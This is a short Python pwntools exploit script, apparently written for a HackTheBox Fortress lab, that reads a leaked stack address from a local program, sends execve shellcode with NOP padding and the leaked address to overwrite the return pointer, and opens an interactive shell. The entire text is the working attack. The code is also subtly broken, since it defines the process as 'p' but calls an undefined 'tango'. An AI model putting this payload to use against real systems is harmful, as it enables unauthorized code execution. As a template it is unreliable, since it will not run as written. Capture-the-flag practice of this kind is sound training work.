#created for htb fortress jet labs
from pwn import * # https://docs.pwntools.com/en/stable/about.html
p=process("./leak") #exec
tango.recvuntil("Oops, I'm leaking! ") #collect leak like % --> "Oops, I'm leaking! 0x7ffed4437110" ref https://docs.pwntools.com/en/stable/tubes.html#pwnlib.tubes.tube.tube.recvuntil
leak=int(tango.recvuntil("\n"),16) #save leak memory variable in int mode on leak variable
print ("Int leak code:") ,leak # 140735484032624
print ("Hex leak code:"), hex(leak),"\n" # 0x7fff88887670
tango.recvuntil("> ") #recv input
shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" #malicious payload overflow RIP 
buf=shellcode
buf+="\x90"*(72-len(shellcode)) #NOPs * 72(segment fault) - shellcode lenght
buf+=p64(leak, endianness="little") # https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.p64
print ("[+] Malicious Payload Sent [+]\n")
tango.sendline(buf) #send 
print ("[+] Payload Works, shell is above: [+]")
tango.interactive() #shellspawn
